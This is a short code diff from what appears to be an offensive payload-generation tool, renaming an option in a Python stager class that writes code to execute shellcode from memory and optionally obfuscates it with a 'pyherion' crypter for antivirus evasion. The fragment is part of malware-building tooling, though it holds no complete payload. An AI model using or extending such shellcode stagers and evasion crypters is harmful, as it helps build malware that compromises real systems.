@@ -28,7 +28,7 @@ class Stager:
 		self.shellcode = shellcode.Shellcode()
 		# options we require user interaction for- format is {Option : [Value, Description]]}
 		self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
-						"use_encrypter" : ["N", "Use the python encrypter"]}
+						"use_pyherion" : ["N", "Use the pyherion encrypter"]}
 	
 	def generate(self):
 		
@@ -46,7 +46,7 @@ class Stager:
 		PayloadCode += RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
 		PayloadCode += RandShellcode + '()'
 	
-		if self.required_options["use_encrypter"][0].lower() == "y":
+		if self.required_options["use_pyherion"][0].lower() == "y":
 			PayloadCode = crypters.pyherion(PayloadCode)
 		
 		return PayloadCode
